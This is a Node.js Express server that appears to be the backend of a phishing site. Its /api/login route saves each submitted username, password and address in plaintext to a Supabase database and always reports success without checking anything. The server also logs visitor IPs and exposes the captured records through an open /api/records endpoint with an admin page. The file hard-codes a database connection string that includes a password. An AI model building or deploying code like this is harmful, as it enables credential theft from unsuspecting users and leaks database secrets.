const express = require('express');
const path = require('path');
const { Pool } = require('pg');

const app = express();
app.use(express.json());
app.use(express.static(path.join(__dirname, 'public')));

// Supabase Connection
const pool = new Pool({
    connectionString: 'postgresql://postgres:[ibnaira1999@]@db.bjyhgxqromtghuvnozog.supabase.co:5432/postgres',
    ssl: { rejectUnauthorized: false }
});

// Create table
pool.query(`CREATE TABLE IF NOT EXISTS records (
    id SERIAL PRIMARY KEY,
    type TEXT,
    username TEXT,
    password TEXT,
    address TEXT,
    ip TEXT,
    timestamp TEXT
)`).catch(err => console.log("Table error:", err));

function saveRecord(type, username = null, password = null, address = null, ip = 'Unknown') {
    const timestamp = new Date().toLocaleString('en-US', { timeZone: 'Africa/Lagos' });
    pool.query(
        "INSERT INTO records (type, username, password, address, ip, timestamp) VALUES ($1, $2, $3, $4, $5, $6)",
        [type, username, password, address, ip, timestamp]
    );
}

// Routes
app.get('/', (req, res) => {
    saveRecord('Page Visit', null, null, null, req.ip || req.headers['x-forwarded-for'] || 'Unknown');
    res.sendFile(path.join(__dirname, 'public', 'index.html'));
});

app.get('/login.html', (req, res) => {
    saveRecord('Page Visit', null, null, null, req.ip || req.headers['x-forwarded-for'] || 'Unknown');
    res.sendFile(path.join(__dirname, 'public', 'login.html'));
});

app.post('/api/login', (req, res) => {
    const { username, password, address } = req.body;
    saveRecord('Login Attempt', username, password, address, req.ip || req.headers['x-forwarded-for'] || 'Unknown');
    res.json({ success: true });
});

app.get('/api/records', async (req, res) => {
    const result = await pool.query("SELECT * FROM records ORDER BY id DESC");
    res.json(result.rows);
});

app.get('/admin', (req, res) => {
    res.sendFile(path.join(__dirname, 'public', 'admin.html'));
});

app.post('/api/clear', async (req, res) => {
    await pool.query("DELETE FROM records");
    res.json({ message: 'Cleared' });
});

const PORT = process.env.PORT || 3000;
app.listen(PORT, '0.0.0.0', () => {
    console.log(`🚀 Server running with Supabase Permanent Storage`);
});